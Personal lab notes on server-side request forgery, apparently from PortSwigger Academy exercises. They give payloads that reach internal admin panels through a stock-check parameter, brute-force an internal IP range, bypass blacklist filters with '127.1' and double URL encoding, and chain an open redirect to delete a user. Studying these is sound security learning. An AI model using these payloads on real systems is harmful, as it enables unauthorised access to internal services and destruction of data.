## Basic

### against the server

- stock chekcer in a shopping application queries back-end REST API:
```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```

> `stockApi=http://localhost/admin` => access control bypass
> `http://localhost/admin/delete?username=carlos` => delete the target user
### against other back-end systems

> `stockApi=http://192.168.0.68/admin` => access control bypass 

- say you have a ip range like `192.168.0.X`:
> **Brute Force**:  `http://192.168.0.§X§:8080/admin` -> 200 status => access control bypass

## blacklist-based input filters

> 1) **stockApi**: `http://127.0.0.1/` -> blocked
> 2) `http://127.1/` -> bypassed but `http://127.1/admin` still gets blocked
> 3) **Obfuscate the "a"**(double-URL encode): `http://127.1/%2561dmin` -> success
## whitelist-based input filters
#todo 

## via open redirection

>  1) **stockApi** -> direct ssrf isn't possible.
>  2) `path` parameter when you click "next product" -> open redirect 
>  3) `/product/nextProduct?path=http://192.168.0.12:8080/admin`
>  4) `.../delete?username=carlos` 
# Blind SSRF

### blind ssrf with shellshock exploitation
#todo
